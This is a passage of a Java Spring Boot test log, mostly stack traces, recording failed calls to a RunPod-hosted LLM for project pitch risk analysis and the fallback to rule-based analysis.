	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

2026-01-17T23:26:46.445Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.service.RiskAnalysisService      : AI analysis failed, falling back to rule-based: Failed to get response from RunPod: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:46.443763","status":500}
2026-01-17T23:26:46.445Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 38 (withAI=true, TTL=infinite)
2026-01-17T23:26:46.645Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache miss: pitch risk 63 (withAI=true)
2026-01-17T23:26:46.646Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.config.RunPodChatModel    : Submitting prompt to RunPod: 688 chars
2026-01-17T23:26:46.646Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.config.RunPodChatModel    : RunPod request payload: {"input":{"max_tokens":2048,"temperature":0.3,"model":"mistral:instruct","prompt":"You are a project risk advisor for a software development team using the Shape Up methodology.\n\nAnalyze the following pitch and provide risk insights:\n\nPitch Title: Healthy Pitch\nDescription: Test description for Healthy Pitch\nAppetite: 14 days\nStatus: IN_PROGRESS\nProgress: 35.7%\nCycle Progress: 50.0%\nTeam: Health Test Team\n\nIdentified Risk Factors:\n- UNCLEAR_REQUIREMENTS: Pitch description is missing or too brief (Impact: 5/10)\n\nProvide your analysis in the following format:\nINSIGHTS:\n- [insight 1]\n- [insight 2]\n- [insight 3]\n\nRECOMMENDATIONS:\n- [recommendation 1]\n- [recommendation 2]\n- [recommendation 3]\n\nCONFIDENCE: [0-100]\n\nKeep insights actionable and specific to this pitch."}}
2026-01-17T23:26:46.650Z ERROR 89700 --- [shipflow] [           main] c.g.f.shipflow.config.RunPodChatModel    : RunPod API call failed: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:46.650104","status":500}

java.lang.RuntimeException: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:46.650104","status":500}
	at com.github.farzadsedaghatbin.shipflow.config.RunPodChatModel.submitJob(RunPodChatModel.java:128) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.config.RunPodChatModel.generate(RunPodChatModel.java:81) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisService.generateAIInsights(RiskAnalysisService.java:588) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisService.analyzePitchRisk(RiskAnalysisService.java:145) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisService.analyzePitchRisk(RiskAnalysisService.java:94) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:352) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:196) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:123) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:385) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:119) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:184) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:717) ~[spring-aop-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisService$$SpringCGLIB$$0.analyzePitchRisk(<generated>) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService.buildPitchHealth(PitchHealthService.java:342) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService.lambda$getCycleHealthSummary$2(PitchHealthService.java:200) ~[classes/:na]
	at java.base/java.util.stream.ReferencePipeline$3$1.accept(ReferencePipeline.java:197) ~[na:na]
	at java.base/java.util.ArrayList$ArrayListSpliterator.forEachRemaining(ArrayList.java:1708) ~[na:na]
	at java.base/java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:509) ~[na:na]
	at java.base/java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:499) ~[na:na]
	at java.base/java.util.stream.ReduceOps$ReduceOp.evaluateSequential(ReduceOps.java:921) ~[na:na]
	at java.base/java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234) ~[na:na]
	at java.base/java.util.stream.ReferencePipeline.collect(ReferencePipeline.java:682) ~[na:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService.getCycleHealthSummary(PitchHealthService.java:201) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService.lambda$getAllActiveCycleHealth$12(PitchHealthService.java:295) ~[classes/:na]
	at java.base/java.util.stream.ReferencePipeline$3$1.accept(ReferencePipeline.java:197) ~[na:na]
	at java.base/java.util.ArrayList$ArrayListSpliterator.forEachRemaining(ArrayList.java:1708) ~[na:na]
	at java.base/java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:509) ~[na:na]
	at java.base/java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:499) ~[na:na]
	at java.base/java.util.stream.ReduceOps$ReduceOp.evaluateSequential(ReduceOps.java:921) ~[na:na]
	at java.base/java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234) ~[na:na]
	at java.base/java.util.stream.ReferencePipeline.collect(ReferencePipeline.java:682) ~[na:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService.getAllActiveCycleHealth(PitchHealthService.java:296) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:352) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:196) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:123) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:385) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:119) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:184) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:717) ~[spring-aop-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService$$SpringCGLIB$$0.getAllActiveCycleHealth(<generated>) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.controller.PitchHealthController.getAllActiveCycleHealthWithAI(PitchHealthController.java:73) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:262) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:190) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:118) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:917) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:829) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1089) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:979) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:903) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:564) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:885) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.TestDispatcherServlet.service(TestDispatcherServlet.java:72) ~[spring-test-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:658) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.mock.web.MockFilterChain$ServletFilterProxy.doFilter(MockFilterChain.java:165) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:110) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:108) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.FilterChainProxy.lambda$doFilterInternal$3(FilterChainProxy.java:231) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$FilterObservation$SimpleFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:479) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:340) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator.lambda$wrapSecured$0(ObservationFilterChainDecorator.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:128) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.intercept.AuthorizationFilter.doFilter(AuthorizationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:126) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:120) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:131) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:85) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:179) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.JwtAuthenticationFilter.doFilterInternal(JwtAuthenticationFilter.java:46) ~[classes/:na]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
